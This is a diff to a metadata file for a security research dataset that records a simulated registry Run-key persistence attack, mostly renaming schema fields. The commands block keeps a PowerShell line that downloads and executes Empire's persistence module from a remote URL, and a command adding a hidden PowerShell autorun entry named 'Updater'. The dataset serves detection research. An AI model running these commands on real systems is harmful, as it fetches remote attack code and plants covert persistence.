@@ -27,15 +27,10 @@ datasets:
       link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/190319-RunKeysModification-UserlandRunKey/WORKSTATION6_Windows_MicrosoftWindowsSysmonOperational.zip
 
 simulation:
-  environment: Blacksmith
-  tools:
-    - type: Manual
-      name: PowerShell
-      module: PowerShell
-      script: https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/persistence/Persistence.psm1
-  permissions_required:
-    - Standard User
-  adversary_view: |-
+  executor: PowerShell
+  scriptUri: https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/persistence/Persistence.psm1
+  supportingFileUris:
+  commands: |-
     Adversary Box
     -------------
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/persistence/Persistence.psm1')
@@ -71,8 +66,8 @@ simulation:
 
     Run
     ---
-    PS C:\Windows\system32>.\Persistence.ps1
+    .\Persistence.ps1
     New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Updater -PropertyType String -Value "`"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe`" -NonInteractive -WindowStyle Hidden"
-    PS C:\Windows\system32>
-
+  output: |-
+    
 detection:
